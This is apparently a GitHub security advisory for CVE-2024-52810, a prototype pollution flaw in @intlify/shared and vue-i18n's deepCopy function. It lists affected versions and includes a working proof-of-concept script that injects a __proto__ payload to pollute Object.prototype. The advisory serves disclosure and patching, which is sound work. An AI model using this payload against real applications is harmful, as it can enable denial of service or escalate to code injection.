# [M] @intlify/shared Prototype Pollution vulnerability

## Summary
Severity: Medium
Advisory: GHSA-hjwq-mjwj-4x6c
CVE: CVE-2024-52810
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X (CVSS_V4)
Published: 2024-12-02
Source: https://github.com/advisories/GHSA-hjwq-mjwj-4x6c
Type: github-advisory

## Affected
- npm: `@intlify/shared` — affected >=9.7.0 <9.14.2
- npm: `@intlify/vue-i18n-core` — affected >=9.7.0 <9.14.2
- npm: `vue-i18n` — affected >=9.7.0 <9.14.2
- npm: `petite-vue-i18n` — affected >=10.0.0 <10.0.5
- npm: `@intlify/shared` — affected >=10.0.0 <10.0.5
- npm: `@intlify/vue-i18n-core` — affected >=10.0.0 <10.0.5
- npm: `vue-i18n` — affected >=10.0.0 <10.0.5

## Details
**Vulnerability type: Prototype Pollution**

**Affected Package:**

Product: @intlify/shared
Version: 10.0.4


**Vulnerability Location(s):**

`node_modules/@intlify/shared/dist/shared.cjs:232:26`


**Description:**

The latest version of `@intlify/shared (10.0.4)` is vulnerable to Prototype Pollution through the entry function(s) `lib.deepCopy`. An attacker can supply a payload with `Object.prototype` setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.

Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.

**PoC:**

```bash
// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
```


```js
(async () => {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
```

**References**

[Prototype Pollution Leading to Remote Code Execution](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) - An example of how prototype pollution can lead to command code injection.

[OWASP Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html) - Best practices for preventing prototype pollution.

[PortSwigger Guide on Preventing Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/preventing) - A detailed guide to securing your applications against prototype pollution.

## References
- https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c
- https://nvd.nist.gov/vuln/detail/CVE-2024-52810
- https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d
- https://github.com/intlify/vue-i18n
